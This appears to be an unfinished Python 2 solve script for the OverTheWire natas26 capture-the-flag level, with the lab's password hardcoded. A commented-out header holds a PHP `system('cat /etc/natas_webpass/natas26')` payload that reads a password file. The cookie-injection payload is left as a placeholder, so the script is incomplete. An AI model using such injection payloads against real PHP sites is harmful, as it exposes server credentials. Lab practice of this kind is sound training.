#! /usr/bin/env python

import requests
import re
import base64
import urllib

usn = 'natas26'
url = 'http://%s.natas.labs.overthewire.org/' % usn
passwd = 'oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T'
login = (usn, passwd)
#headers = {"User-Agent": "<?php system('cat /etc/natas_webpass/natas26');  ?>"}

request = requests.Session()
#def get_source_code():
  #connection = request.get(url, auth = login)
  #print connection.text

def solve_lab():
  connection = request.get(url, auth = login)
  request.cookies['drawing'] = # Enter b64 encoded string here
  connection = request.get(url+ '?x1=0&y1=0&x2=99&y2=99', auth = login)
  #print connection.text
  print base64.b64decode(urllib.unquote(request.cookies['drawing']))